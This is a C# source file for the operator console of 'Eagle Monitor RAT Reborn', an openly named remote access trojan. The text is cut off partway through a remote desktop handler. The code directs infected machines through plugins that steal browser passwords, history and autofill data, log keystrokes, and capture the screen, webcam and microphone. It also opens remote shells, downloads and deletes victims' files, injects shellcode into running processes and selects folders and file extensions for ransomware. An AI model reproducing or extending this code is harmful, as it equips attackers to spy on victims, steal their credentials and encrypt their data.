﻿using Eagle_Monitor_RAT_Reborn.Controls;
using Eagle_Monitor_RAT_Reborn.Network;
using FastColoredTextBoxNS;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using NAudio.Wave;
using Newtonsoft.Json;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn
{
    internal partial class ClientForm : FormPattern
    {
        internal ClientHandler ClientHandler { get; set; }
        internal RemoteDesktopHandler RemoteDesktopHandler { get; set; }
        internal RemoteWebCamHandler RemoteWebCamHandler { get; set; }
        internal RemoteMicrophoneHandler RemoteMicrophoneHandler { get; set; }
        internal KeyloggerHandler KeyloggerHandler { get; set; }
        internal ChatHandler ChatHandler { get; set; }
        internal RemoteShellHandler RemoteShellHandler { get; set; }

        internal long DownloadFileTicket { get; set; }
        internal Dictionary<long, DataGridViewRow> DownloadList { get; set; }

        internal long DeleteFileTicket { get; set; }
        internal Dictionary<long, DataGridViewRow> DeleteList { get; set; }

        internal ClientForm(ClientHandler clientHandler)
        {
            InitializeComponent();
            this.ClientHandler = clientHandler;
            this.DownloadFileTicket = 0;
            this.DownloadList = new Dictionary<long, DataGridViewRow>();

            this.DeleteFileTicket = 0;
            this.DeleteList = new Dictionary<long, DataGridViewRow>();

            if (this.ClientHandler.IsAdmin)
                this.askUACGuna2Button.Enabled = false;
        }

        private void ClientForm_Load(object sender, EventArgs e)
        {
            SetLocalAudioDevices();
            SetUI();
        }

        #region "UI Fixes + ControlBoxes"
        private void SetUI()
        {
            this.SuspendLayout();
            #region "Double buffer"
            Utils.Enable(this.passwordsDataGridView);
            Utils.Enable(this.historyDataGridView);

            Utils.Enable(this.keywordsDataGridView);
            Utils.Enable(this.autofillDataGridView);

            Utils.Enable(this.fileManagerDataGridView);
            Utils.Enable(this.dowloadFileDataGridView);
            Utils.Enable(this.processDataGridView);

            Utils.Enable(this.importLibDataGridView);
            Utils.Enable(this.shellcodeDataGridView);
            Utils.Enable(this.managedPEDataGridView);
            Utils.Enable(this.nativePEDataGridView);

            Utils.Enable(this.systemInformationDataGridView);
            Utils.Enable(this.componentsDataGridView);
            Utils.Enable(this.cpuDataGridView);
            Utils.Enable(this.networkInformationDataGridView);

            Utils.Enable(this.pathRansomwareDataGridView);
            #endregion
            #region "Vertical Scrollbar"
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.passwordsDataGridView, this.guna2VScrollBar1, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.historyDataGridView, this.guna2VScrollBar2, true);

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(autofillDataGridView, this.guna2VScrollBar5, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(keywordsDataGridView, this.guna2VScrollBar6, true);

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.fileManagerDataGridView, this.guna2VScrollBar3, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.processDataGridView, this.guna2VScrollBar4, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.dowloadFileDataGridView, this.guna2VScrollBar7, true);

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.shellcodeDataGridView, this.guna2VScrollBar8, true);

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.cpuDataGridView, this.guna2VScrollBar9, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.componentsDataGridView, this.guna2VScrollBar10, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.systemInformationDataGridView, this.guna2VScrollBar11, true);

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.restorePointDataGridView, this.guna2VScrollBar12, true);

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.pathRansomwareDataGridView, this.guna2VScrollBar13, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.extensionRansomwareDataGridView, this.guna2VScrollBar14, true);

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.networkInformationDataGridView, this.guna2VScrollBar15, true);
            #endregion
            #region "TabImage"
            Utils.SetTabImage(this.mainGuna2TabControl, new Icon[]
            {
                Properties.Resources.icons8_database_backup,
                Properties.Resources.icons8_file_explorer,
                Properties.Resources.icons8_system_task,
                Properties.Resources.icons8_remote_desktop,
                Properties.Resources.icons8_control_panel,
                Properties.Resources.icons8_microsoft_admin,
                Properties.Resources.icons8_security_document,
                Properties.Resources.icons8_computer_virus
            });
   
            Utils.SetTabImage(this.recoveryGuna2TabControl, new Icon[]
            {
                Properties.Resources.icons8_key,
                Properties.Resources.icons8_time_machine,
                Properties.Resources.icons8_text_input_form,
                Properties.Resources.icons8_single_line_text_input
            });

            Utils.SetTabImage(this.remoteGuna2TabControl, new Icon[]
            {
                Properties.Resources.icons8_imac,
                Properties.Resources.icons8_video_call,
                Properties.Resources.icons8_microphone
            });

            Utils.SetTabImage(this.fileManagerGuna2TabControl, new Icon[]
            {
                Properties.Resources.icons8_file_explorer,
                Properties.Resources.icons8_download
            });     

            Utils.SetTabImage(this.miscellaneousGuna2TabControl, new Icon[]
            {
                Properties.Resources.icons8_computer_virus,
                Properties.Resources.icons8_keyboard,
                Properties.Resources.icons8_information,
                Properties.Resources.icons8_question_mark,
                Properties.Resources.icons8_chat
            });

            Utils.SetTabImage(this.memoryExecutionGuna2TabControl, new Icon[]
            {
                Properties.Resources.icons8_c_plus_plus,
                Properties.Resources.icons8_Binary_Code,
                Properties.Resources.icons8_source_code,
                Properties.Resources.icons8_visual_basic
            });

            Utils.SetTabImage(this.ransomwareGuna2TabControl, new Icon[]
            {
                Properties.Resources.icons8_private_folder,
                Properties.Resources.icons8_settings,
                Properties.Resources.icons8_lock_file
            });

            Utils.SetTabImage(this.informationGuna2TabControl, new Icon[] 
            {
                Properties.Resources.icons8_electronics,
                Properties.Resources.icons8_ethernet_on
            });
            #endregion

            Misc.DotNetCodeExecution.RowAdder("System.dll", this.importLibDataGridView);
            Misc.DotNetCodeExecution.RowAdder("Microsoft.VisualBasic.dll", this.importLibDataGridView);
            Misc.DotNetCodeExecution.RowAdder("System.Windows.Forms.dll", this.importLibDataGridView);
            Misc.DotNetCodeExecution.RowAdder("System.Management.dll", this.importLibDataGridView);
            Misc.DotNetCodeExecution.RowAdder("System.Drawing.dll", this.importLibDataGridView);

            string extensionsPath = this.ClientHandler.ClientPath + "\\Ransomware\\extensions.txt";

            if (!File.Exists(extensionsPath))
            {
                File.WriteAllText(extensionsPath, Properties.Resources.extensions);
            }

            string[] extensions = File.ReadAllLines(extensionsPath);
            foreach (string extension in extensions)
            {
                int rowId = this.extensionRansomwareDataGridView.Rows.Add();

                DataGridViewRow row = this.extensionRansomwareDataGridView.Rows[rowId];

                row.Cells["Column47"].Value = extension;
            }

            string pathAffectecd = this.ClientHandler.ClientPath + "\\Ransomware\\paths.txt";

            if (File.Exists(pathAffectecd))
            {
                string[] paths = File.ReadAllLines(pathAffectecd);
                foreach (string path in paths)
                {
                    int rowId = this.pathRansomwareDataGridView.Rows.Add();

                    DataGridViewRow row = this.pathRansomwareDataGridView.Rows[rowId];

                    row.Cells["Column46"].Value = path;
                }
            }
            this.ResumeLayout();
        }
        private void closeGuna2ControlBox_Click(object sender, EventArgs e)
        {
            FixClientHandlersBeforeLeaving();

            StringBuilder pathAffected = new StringBuilder();

            foreach (DataGridViewRow row in this.pathRansomwareDataGridView.Rows)
            {
                pathAffected.AppendLine(row.Cells[0].Value.ToString());
            }
            File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\paths.txt", pathAffected.ToString());

            StringBuilder extensions = new StringBuilder();

            foreach (DataGridViewRow row in this.extensionRansomwareDataGridView.Rows)
            {
                extensions.AppendLine(row.Cells[0].Value.ToString());          
            }
            File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\extensions.txt", extensions.ToString());

            if ((passwordsDataGridView.Rows.Count > 0 || historyDataGridView.Rows.Count > 0 || keywordsDataGridView.Rows.Count > 0 || autofillDataGridView.Rows.Count > 0) && !Program.settings.autoSaveRecovery)
            {
                DialogResult r = MessageBox.Show("It seems that some data have not been saved. Do you want to save them before closing ?", "Data not saved", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Information);
                if (r == DialogResult.Yes)
                {
                    Misc.Utils.ToCSV(this.passwordsDataGridView, this.ClientHandler.ClientPath + "\\Passwords\\" + Misc.Utils.DateFormater() + ".csv");
                    Misc.Utils.ToCSV(this.historyDataGridView, this.ClientHandler.ClientPath + "\\History\\" + Misc.Utils.DateFormater() + ".csv");

                    Misc.Utils.ToCSV(this.ClientHandler.ClientForm.keywordsDataGridView, this.ClientHandler.ClientPath + "\\Keywords\\" + Misc.Utils.DateFormater() + ".csv");
                    Misc.Utils.ToCSV(this.ClientHandler.ClientForm.autofillDataGridView, this.ClientHandler.ClientPath + "\\Autofill\\" + Misc.Utils.DateFormater() + ".csv");

                    this.Close();
                }

                if (r == DialogResult.No)
                    this.Close();

                if (r == DialogResult.Cancel)
                    return;

            }
            else
                this.Close();
        }

        private void FixClientHandlersBeforeLeaving()
        {
            if (this.RemoteDesktopHandler != null)
            {
                mouseGuna2ToggleSwitch.Checked = false;
                keyboardGuna2ToggleSwitch.Checked = false;

                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                {
                    BaseIp = this.ClientHandler.IP,
                    HWID = this.ClientHandler.HWID
                };
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
              //  this.remoteDesktopHandler.clientHandler.StartSendData(remoteViewerPacket);
            }

            if (this.RemoteWebCamHandler != null)
            {
                RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
                {
                    BaseIp = this.ClientHandler.IP,
                    HWID = this.ClientHandler.HWID
                };
                ClientHandler.StartSendData(this.RemoteWebCamHandler.ClientHandler, remoteCameraCapturePacket);
                //this.remoteWebCamHandler.clientHandler.StartSendData(remoteCameraCapturePacket);
            }

            if (this.RemoteMicrophoneHandler != null)
            {
                RemoteAudioCapturePacket remoteAudioCapturePacket = new RemoteAudioCapturePacket(PacketType.AUDIO_RECORD_OFF)
                {
                    BaseIp = this.ClientHandler.IP,
                    HWID = this.ClientHandler.HWID
                };
                ClientHandler.StartSendData(this.RemoteMicrophoneHandler.ClientHandler, remoteAudioCapturePacket);
            }

            if (this.KeyloggerHandler != null)
            {
                KeylogPacket keylogPacket = new KeylogPacket(this.ClientHandler.IP, this.ClientHandler.HWID) 
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Keylogger.dll"), 1)
                };

                ClientHandler.StartSendData(this.KeyloggerHandler.ClientHandler, keylogPacket);
                this.keyloggerGuna2Button.Text = "Start";
                File.WriteAllText(this.ClientHandler.ClientPath + "\\Keystrokes\\" + Misc.Utils.DateFormater() + ".txt", this.keystrokeRichTextBox.Text);
            }

            if (this.ChatHandler != null)
            {
                RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF)
                {
                    BaseIp = this.ClientHandler.IP
                };
                ClientHandler.StartSendData(this.ChatHandler.ClientHandler, chatPacket);
                this.chatGuna2Button.Text = "Start";
            }
  
            if (this.RemoteShellHandler != null)
            {
                StopShellSessionPacket stopShellSessionPacket = new StopShellSessionPacket()
                {
                    BaseIp = this.ClientHandler.IP,
                    HWID = this.ClientHandler.HWID
                };
                ClientHandler.StartSendData(this.RemoteShellHandler.ClientHandler, stopShellSessionPacket);
                this.remoteShellGuna2Button.Text = "Start Session";
            }
        }

        private void logoPictureBox_MouseDown(object sender, MouseEventArgs e)
        {
            Utils.MoveForm(this);
        }

        private void clientLabel_MouseDown(object sender, MouseEventArgs e)
        {
            Utils.MoveForm(this);
        }

        private void ClientForm_MouseLeave(object sender, EventArgs e)
        {
            this.passwordsDataGridView.ClearSelection();
            this.passwordsDataGridView.CurrentCell = null;

            this.historyDataGridView.ClearSelection();
            this.historyDataGridView.CurrentCell = null;

            this.fileManagerDataGridView.ClearSelection();
            this.fileManagerDataGridView.CurrentCell = null;

            this.autofillDataGridView.ClearSelection();
            this.autofillDataGridView.CurrentCell = null;

            this.keywordsDataGridView.ClearSelection();
            this.keywordsDataGridView.CurrentCell = null;

            this.dowloadFileDataGridView.ClearSelection();
            this.dowloadFileDataGridView.CurrentCell = null;

            this.cpuDataGridView.ClearSelection();
            this.cpuDataGridView.CurrentCell = null;

            this.componentsDataGridView.ClearSelection();
            this.componentsDataGridView.CurrentCell = null;

            this.systemInformationDataGridView.ClearSelection();
            this.systemInformationDataGridView.CurrentCell = null;

            this.processDataGridView.ClearSelection();
            this.processDataGridView.CurrentCell = null;
        }
        #endregion
        #region "Recovery"  
        private void getPasswordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PasswordsPacket passwordsPacket = new PasswordsPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
            };

            ClientHandler.StartSendData(this.ClientHandler, passwordsPacket);
        }

        private void passwordsDataGridView_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = passwordsDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    passwordsDataGridView.ClearSelection();
                    passwordsDataGridView.CurrentCell = null;
                }
            }
        }
     
        private void historyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HistoryPacket historyPacket = new HistoryPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
            };

            ClientHandler.StartSendData(this.ClientHandler, historyPacket);
        }

        private void historyDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = historyDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    historyDataGridView.ClearSelection();
                    historyDataGridView.CurrentCell = null;
                }
            }
        }
       

        private void autofillToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AutofillPacket autofillPacket = new AutofillPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
            };

            ClientHandler.StartSendData(this.ClientHandler, autofillPacket);
        }

        private void keywordsToolStripMenuItem_Click(object sender, EventArgs e)
        {

            KeywordsPacket keywordsPacket = new KeywordsPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Stealer.dll"), 1)
            };

            ClientHandler.StartSendData(this.ClientHandler, keywordsPacket);
        }

        private void keywordsDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = keywordsDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    keywordsDataGridView.ClearSelection();
                    keywordsDataGridView.CurrentCell = null;
                }
            }
        }

        private void autofillDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = autofillDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    autofillDataGridView.ClearSelection();
                    autofillDataGridView.CurrentCell = null;
                }
            }
        }

        #endregion
        #region "File Manager"
        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DiskPacket diskPacket = new DiskPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, diskPacket);
        }

        private void disksGuna2ComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.labelPath.Text = disksGuna2ComboBox.Text;
            FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
        }

        private void goToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (fileManagerDataGridView.SelectedRows.Count == 1)
            {
                if (fileManagerDataGridView.SelectedRows[0].Cells[2].Value.ToString() == "Directory")
                {
                    string newPath = labelPath.Text + fileManagerDataGridView.SelectedRows[0].Cells[1].Value.ToString() + "\\";
                    this.labelPath.Text = newPath;
                    FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
                }
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.labelPath.Text.Length > 3)
            {
                string[] Splitter = this.labelPath.Text.Split('\\');
                string NewPath = null;
                for (var i = 0; i <= Splitter.Length - 3; i++)
                {
                    NewPath += Splitter[i] + "\\";
                }
                this.labelPath.Text = NewPath;
                FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                };
                ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
            }
        }

        private void fileManagerDataGridView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (fileManagerDataGridView.SelectedRows.Count == 1)
            {
                if (fileManagerDataGridView.SelectedRows[0].Cells[2].Value.ToString() == "Directory")
                {
                    string newPath = labelPath.Text + fileManagerDataGridView.SelectedRows[0].Cells[1].Value.ToString() + "\\";
                    this.labelPath.Text = newPath;
                    FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    ClientHandler.StartSendData(ClientHandler, fileManagerPacket);
                }
            }
        }
        private void downloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow file in fileManagerDataGridView.SelectedRows)
            {
                if (file.Cells[2].Value.ToString() == "Directory")
                    continue;
                else
                {
                    int rowId = this.dowloadFileDataGridView.Rows.Add();
                    DataGridViewRow row = this.dowloadFileDataGridView.Rows[rowId];

                    row.Cells["Column29"].Tag = 0;//bytes
                    row.Cells["Column30"].Tag = 0;//%
                    row.Tag = file.Tag;//full bytes size

                    row.Cells["Column28"].Value = Misc.Utils.SplitPath(labelPath.Text + file.Cells[1].Value.ToString());
                    row.Cells["Column29"].Value = $"{row.Cells["Column29"].Tag} / {Misc.Utils.Numeric2Bytes(long.Parse(row.Tag.ToString()))}";
                    row.Cells["Column30"].Value = "0%";
                    row.Cells["Column10"].Value = labelPath.Text + file.Cells[1].Value.ToString();
                    //row.Cells["Column2"].Value = connectedPacket.HWID;
                }
            }
        }

        private void startDownloadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow file in dowloadFileDataGridView.SelectedRows)
            {
                DownloadFilePacket dowloadFilePacket = new DownloadFilePacket(file.Cells[3].Value.ToString(), DownloadFileTicket)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1),
                    bufferSize = Program.settings.bufferSize
                };

                DownloadList.Add(DownloadFileTicket, file);
                ClientHandler.StartSendData(this.ClientHandler, dowloadFilePacket);
                DownloadFileTicket += 1;
            }
        }
        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow file in fileManagerDataGridView.SelectedRows)
            {
                if (file.Cells[2].Value.ToString() == "Directory")
                    continue;
                else
                {
                    string fullPath = labelPath.Text + file.Cells[1].Value.ToString();
                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(fullPath, Misc.Utils.SplitPath(fullPath), DeleteFileTicket)
                    {
                        Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };

                    DeleteList.Add(DeleteFileTicket, file);
                    ClientHandler.StartSendData(this.ClientHandler, deleteFilePacket);
                    DeleteFileTicket += 1;
                }
            }
        }
        #region "Shortcuts"
        private void downloadSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOWNLOADS)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
        }

        private void desktopSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DESKTOP)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
        }

        private void documentsSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOCUMENTS)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
        }

        private void userProfileSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.USER_PROFILE)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, shortCutFileManagersPacket);
        }
        #endregion
        #region "Directory"

        private void addRansomwareToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow directory in fileManagerDataGridView.SelectedRows)
            {
                if (directory.Cells[2].Value.ToString() == "File")
                    continue;
                else
                {
                    string fullPath = labelPath.Text + directory.Cells[1].Value.ToString();

                    int rowId = pathRansomwareDataGridView.Rows.Add();
                    DataGridViewRow row = pathRansomwareDataGridView.Rows[rowId];

                    row.Cells["Column46"].Value = fullPath.ToString();
                }
            }
        }
        #endregion
        private void fileManagerDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = fileManagerDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    fileManagerDataGridView.ClearSelection();
                    fileManagerDataGridView.CurrentCell = null;
                }
            }
        }
        private void dowloadFileDataGridView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = dowloadFileDataGridView.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    dowloadFileDataGridView.ClearSelection();
                    dowloadFileDataGridView.CurrentCell = null;
                }
            }
        }
        #endregion
        #region "Process Manager"
        private void refreshProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProcessManagerPacket processManagerPacket = new ProcessManagerPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, processManagerPacket);
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
            {
                int procId = int.Parse(selected.Cells[1].Value.ToString());
                ProcessKillerPacket processKillerPacket = new ProcessKillerPacket(procId, selected.Cells[2].Value.ToString(), selected.Index)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
                };
                ClientHandler.StartSendData(ClientHandler, processKillerPacket);
            }
        }

        private void suspendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
            {
                int procId = int.Parse(selected.Cells[1].Value.ToString());
                SuspendProcessPacket suspendProcessPacket = new SuspendProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
                };
                ClientHandler.StartSendData(ClientHandler, suspendProcessPacket);
            }
        }

        private void resumeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
            {
                int procId = int.Parse(selected.Cells[1].Value.ToString());
                ResumeProcessPacket resumeProcessPacket = new ResumeProcessPacket(procId, selected.Cells[2].Value.ToString(), selected.Index)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
                };
                ClientHandler.StartSendData(ClientHandler, resumeProcessPacket);
            }
        }

        private void shellcodeInjectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProcessInjectionPacket processInjectionPacket;
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    foreach (DataGridViewRow selected in processDataGridView.SelectedRows)
                    {
                        int procId = int.Parse(selected.Cells[1].Value.ToString());
                        byte[] payload = Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1);
                        switch (Program.settings.processInjectionMethod)
                        {
                            case ProcessInjectionPacket.INJECTION_METHODS.CLASSIC:
                                processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.CLASSIC, procId)
                                {
                                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
                                };
                                ClientHandler.StartSendData(ClientHandler, processInjectionPacket);
                                break;
                            case ProcessInjectionPacket.INJECTION_METHODS.MAP_VIEW:
                                processInjectionPacket = new ProcessInjectionPacket(payload, ProcessInjectionPacket.INJECTION_METHODS.MAP_VIEW, procId)
                                {
                                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\ProcessManager.dll"), 1)
                                };
                                ClientHandler.StartSendData(ClientHandler, processInjectionPacket);
                                break;
                        }
                    }
                }
            }
        }

        #endregion
        #region "Remote Desktop"
        private List<Keys> keysPressed;
        internal bool enabledMouse { get; set; }
        internal bool enableKeyboard { get; set; }

        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteDesktopHandler = new RemoteDesktopHandler();
                keysPressed = new List<Keys>();
                this.RemoteDesktopHandler = new RemoteDesktopHandler();
                RemoteDesktopHandler.BaseIp = this.ClientHandler.IP;
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                    BaseIp = this.ClientHandler.IP,
                    HWID = this.ClientHandler.HWID,
                    width = remoteDesktopPictureBox.Width,
                    height = remoteDesktopPictureBox.Height,
                    format = "JPEG",
                    quality = qualityGuna2TrackBar.Value,
                    timeMS = 1
                };
                ClientHandler.StartSendData(this.ClientHandler, remoteViewerPacket);
            }
            else
            {
                mouseGuna2ToggleSwitch.Checked = false;
                keyboardGuna2ToggleSwitch.Checked = false;
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                {
                    BaseIp = this.RemoteDesktopHandler.BaseIp,
                    HWID = this.ClientHandler.HWID
                };
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
            }
        }
        private void remoteDesktopPictureBox_SizeChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                    BaseIp = this.ClientHandler.IP,
                    width = remoteDesktopPictureBox.Width,
                    height = remoteDesktopPictureBox.Height,
                    format = "JPEG",
                    quality = qualityGuna2TrackBar.Value,
                    timeMS = 1
                };
                ClientHandler.StartSendData(this.RemoteDesktopHandler.ClientHandler, remoteViewerPacket);
            }
        }
        private void qualityGuna2TrackBar_ValueChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
